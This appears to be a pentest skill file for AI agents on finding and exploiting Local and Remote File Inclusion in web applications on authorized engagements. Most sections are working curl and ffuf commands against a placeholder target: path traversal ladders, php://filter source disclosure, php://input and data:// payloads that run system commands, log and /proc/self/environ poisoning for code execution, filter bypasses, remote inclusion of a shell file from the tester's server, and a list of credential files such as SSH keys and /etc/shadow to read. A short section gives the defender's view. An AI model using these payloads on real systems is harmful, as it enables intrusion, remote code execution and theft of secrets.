---
name: lfi-rfi
description: Use when testing a web application for Local and Remote File
  Inclusion on an authorized engagement. Covers path traversal probes,
  PHP wrapper abuse (php://filter, data://, expect://, zip://, phar://),
  log poisoning and /proc/self/environ tricks for code execution, null
  byte and filter bypass techniques, and remote file inclusion through
  allow_url_include. Use when page, file, template, language, or view
  parameters load local files or URLs and might be abusable.
version: 1.0.0
domain: web
lifecycle: stable
last_verified: "2026-10-23"
requires: []
extends: []
relates: [webapp-pentest-methodology, web-sqli, ssrf]
tools:
  - name: ffuf
    version: 2.1
  - name: Burp Suite
    version: "2026.2"
  - name: Python
    version: "3.12"
---

File inclusion happens when a `page`, `file`, `template`, or `lang`
parameter is passed to a file read or include function without checks.
Local File Inclusion reads server files; Remote File Inclusion pulls
code from an attacker server. This skill covers the full authorized
methodology: traversal probes, wrapper abuse, filter bypasses, and
escalation to code execution. All testing targets systems you have
written permission to test.

## Quick Workflow

1. Find parameters that name a file: `page=`, `file=`, `template=`,
   `lang=`, `view=`, `doc=`, and route segments like `/pages/about`.
2. Probe with path traversal (`../../../../etc/passwd`) and watch for
   file content in the response.
3. Test PHP wrappers: `php://filter` for source disclosure,
   `php://input` and `data://` for code execution.
4. Bypass traversal filters with encoding, doubling, absolute paths,
   and truncation tricks.
5. Escalate LFI to RCE via log poisoning, /proc/self/environ, PHP
   sessions, or uploaded files.
6. Test RFI by pointing the parameter at your server when URL includes
   look enabled.
7. Fuzz the parameter with a traversal wordlist for hidden behaviors.
8. Record the exact payload and every file read or command run.

## 1. Path traversal detection

Start simple. Walk up the tree and look for `/etc/passwd` content.

```bash
# Basic traversal ladder: increase depth until the app root is escaped
for d in 1 2 3 4 5 6 7 8; do
  trav=$(printf '../%.0s' $(seq 1 $d))
  out=$(curl -s "https://target.example/page?file=${trav}etc/passwd")
  if echo "$out" | grep -q 'root:'; then echo "depth $d works"; break; fi
done
```

```bash
# Absolute path test (works when the app prepends nothing or strips ../)
curl -s 'https://target.example/page?file=/etc/passwd' | grep -c 'root:'

# Windows targets
curl -s 'https://target.example/page?file=../../../../windows/win.ini' \
  | grep -c 'for 16-bit app support'
```

```bash
# Fuzz with a traversal wordlist for filter quirks and odd parameters
ffuf -u 'https://target.example/page?file=FUZZ' \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  -mr 'root:' -t 20 -p 0.2
```

A hit on `root:` is confirmed LFI. Note whether the file content is
rendered as HTML (view-source to see it raw) or stripped.

## 2. PHP wrapper abuse

On PHP targets, wrappers turn a file read into source disclosure or
code execution.

```bash
# php://filter: read PHP source as base64 (avoids the code executing)
curl -s 'https://target.example/page?file=php://filter/convert.base64-encode/resource=index' \
  | grep -o '[A-Za-z0-9+/=]\{200,\}' | head -1 > /tmp/b64.txt
# decode: base64 -d /tmp/b64.txt | head -50
```

```bash
# php://filter with a full path
curl -s --get 'https://target.example/page' \
  --data-urlencode 'file=php://filter/convert.base64-encode/resource=/var/www/html/config.php' \
  | grep -o '[A-Za-z0-9+/=]\{200,\}' | head -1
```

```bash
# php://input: POST your PHP code, the wrapper executes it on include
# (only when the include actually executes the stream)
curl -s -X POST 'https://target.example/page?file=php://input' \
  -d '<?php echo "PWNED:"; system("id"); ?>' | grep -o 'PWNED:[^<]*' | head -1
```

```bash
# data:// wrapper: no outbound request needed (RFI without a server)
curl -s --get 'https://target.example/page' \
  --data-urlencode 'file=data://text/plain,<?php echo "PWNED:"; system("id"); ?>' \
  | grep -o 'PWNED:[^<]*' | head -1

# data:// base64 variant (dodges quote filters)
curl -s --get 'https://target.example/page' \
  --data-urlencode 'file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpOyA/Pg==' \
  | grep -o 'uid=[0-9]*' | head -1
```

Other wrappers worth one probe each: `zip://` (include a file inside an
uploaded zip), `phar://` (PHP archives, deserialization plus include),
and `expect://` (almost always disabled, but one quick test is cheap).

## 3. Filter bypasses

Filters usually strip `../` once or blocklist keywords. Bypass with:

```bash
# Double traversal: filter strips one "../", leaving another
# ....//....//etc/passwd  ->  ../../etc/passwd after one strip pass
curl -s 'https://target.example/page?file=....//....//etc/passwd' | grep -c 'root:'

# Double URL encoding: filter decodes once, app decodes twice
# %252e%252e%252fetc%252fpasswd
curl -s 'https://target.example/page?file=%252e%252e%252fetc%252fpasswd' | grep -c 'root:'

# Mixed encoding
curl -s 'https://target.example/page?file=..%2f..%2fetc%2fpasswd' | grep -c 'root:'

# Backslashes on Windows, and mixed slashes
curl -s 'https://target.example/page?file=..%5c..%5cwindows%5cwin.ini' | grep -c '16-bit'

# Appended extension bypass: app adds ".php", so break out of it
# file=../../etc/passwd%00        (null byte, PHP < 5.3.4 only)
# file=../../etc/passwd/.         (trailing /. tricks the extension check)
# file=....//....//etc/passwd/./  (keep the suffix harmless)
curl -s 'https://target.example/page?file=../../../../etc/passwd/.' | grep -c 'root:'
```

```bash
# If the app requires the path to start with a directory, keep the
# prefix and traverse after it:
# file=pages/../../../../etc/passwd
curl -s 'https://target.example/page?file=pages/../../../../etc/passwd' | grep -c 'root:'
```

Automate bypass rotation with Burp Intruder or a small loop, testing
each variant and grepping for `root:`.

## 4. LFI to RCE: log poisoning

If you can write attacker-controlled text into a file the LFI can read
(logs, sessions), the include executes it.

```bash
# Step 1: poison the access log with PHP via the User-Agent
curl -s -A '<?php system("id"); ?>' 'https://target.example/' -o /dev/null

# Step 2: include the log file
curl -s --get 'https://target.example/page' \
  --data-urlencode 'file=/var/log/apache2/access.log' | grep -o 'uid=[0-9]*' | head -1
```

Common log paths to try: `/var/log/apache2/access.log`,
`/var/log/httpd/access_log`, `/var/log/nginx/access.log`,
`/var/log/auth.log` (via SSH username poisoning). If the log path is
unknown, read `/proc/self/fd/` or `/proc/self/environ` through the LFI
itself to discover it.

```bash
# /proc/self/environ often contains the User-Agent: poison it the same way
curl -s -A '<?php system("id"); ?>' 'https://target.example/' -o /dev/null
curl -s --get 'https://target.example/page' \
  --data-urlencode 'file=/proc/self/environ' | grep -o 'uid=[0-9]*' | head -1
```

PHP session poisoning: if you control a session value (username,
language preference), find the session file
(`/var/lib/php/sessions/sess_<PHPSESSID>`) and include it.

Mail poisoning and other writable files follow the same pattern: any
file you can write plus any LFI that includes it equals code execution.

## 5. Remote File Inclusion

RFI needs `allow_url_include=On` (rare on modern PHP, common on old
targets). Test quickly.

```bash
# Host a harmless PHP file on your server, then:
curl -s --get 'https://target.example/page' \
  --data-urlencode 'file=http://YOUR-SERVER/shell.txt' | head -c 300
# Watch your server log: a hit means the target fetched it (SSRF at
# minimum). If your PHP executed, it is full RFI.
```

```bash
# Bypass attempts when "http" is blocklisted but wrappers are not
# file=\\YOUR-SERVER\share\shell.txt   (SMB wrapper, Windows PHP)
```

If RFI fails but the target fetches the URL without executing it, treat
it as SSRF (see the ssrf skill) and pivot to internal targets instead.

## 6. Reading without execution

Sometimes you only get file reads. Make them count:

```bash
# Linux enumeration through LFI (authorized targets, read-only)
/etc/passwd                 # users
/etc/shadow                 # hashes (needs privileges, try anyway)
/etc/hosts /etc/hostname    # network context
/proc/self/cmdline          # how the app runs
/proc/self/environ           # secrets in env vars
/var/www/html/config.php     # via php://filter, app secrets
~/.ssh/id_rsa                # developer keys (long shot, big win)
/var/log/apache2/access.log  # confirm log paths for poisoning
```

```bash
# Pull several files in one loop once traversal is confirmed
for f in /etc/passwd /etc/hosts /proc/self/cmdline; do
  echo "=== $f ==="
  curl -s --get 'https://target.example/page' \
    --data-urlencode "file=../../../../..$f" | head -c 300
  echo
done
```

## Edge cases

- The application appends `.php` or a base path: combine the prefix
  keep (`pages/...`) with suffix neutralization (`/.` or `%00` on old
  PHP).
- `php://filter` returns base64 but the page truncates long output:
  read the file in chunks or target smaller files first.
- The traversal works but the response is a download: check
  Content-Disposition; the file content is in the body, just save it.
- open_basedir restrictions: PHP may allow `/var/www/` but not `/etc`;
  enumerate inside the allowed tree (config files, uploaded files).
- The parameter is used in an `include` but output buffering eats
  errors: a blank page with a 200 can still mean the include ran;
  use a marker string (`echo "MARKER"`) to confirm execution.
- Nginx/Apache path normalization strips `../` before the app sees it:
  try absolute paths and encoded variants that survive one decode.

## Escalation

- LFI confirmed but no wrapper works: fall back to log poisoning with
  plain traversal, which needs no wrapper at all.
- Logs are not readable (permissions): try PHP session files, uploaded
  avatars (upload a GIF with PHP code, include it), or the
  `/proc/self/fd/N` descriptors of already-open files.
- `data://` blocked but `php://input` open: POST the payload instead.
- Both blocked: check `zip://` against an uploaded zip, and `phar://`
  against an uploaded phar (phar also enables deserialization chains).
- No code execution possible: a read-only LFI still yields configs,
  secrets, and source code; pivot to credential reuse and source
  review rather than forcing RCE.
- RFI blocked at the network layer: the outbound fetch attempt still
  proves SSRF; use it for internal recon per the ssrf skill.

## Detection and defender view

Defenders see file inclusion as traversal sequences (`../`, encoded
dots) and wrapper schemes (`php://`, `data://`) in request parameters,
followed by reads of files outside the web root or outbound fetches to
odd hosts. Web logs showing `file=/etc/passwd` are unmistakable.
Poisoning shows up as PHP code in User-Agent strings inside access
logs. The durable fixes are an allow-list of includable files (never
build paths from user input), `allow_url_include=Off`,
`open_basedir` restrictions, storing uploads outside the web root
without execute permission, and not logging raw User-Agent strings
into files that any include can reach. Containerize or chroot the app
so a traversal cannot reach host secrets.

## Key references

- MITRE ATT&CK T1190 (Exploit Public-Facing Application): the
  inclusion point.
- MITRE ATT&CK T1059 (Command and Scripting Interpreter): post-include
  command execution.
- MITRE ATT&CK T1552.001 (Unsecured Credentials: Credentials In
  Files): config and key theft.
- CWE-98 (Improper Control of Filename for Include/Require Statement
  in PHP Program, PHP Remote File Inclusion).
- CWE-22 (Improper Limitation of a Pathname to a Restricted Directory,
  Path Traversal).
- OWASP Testing Guide: Testing for Local File Inclusion,
  Testing for Remote File Inclusion.
- PortSwigger Web Security Academy: File inclusion and path traversal
  labs.
- PHP manual: php:// wrappers and allow_url_include.
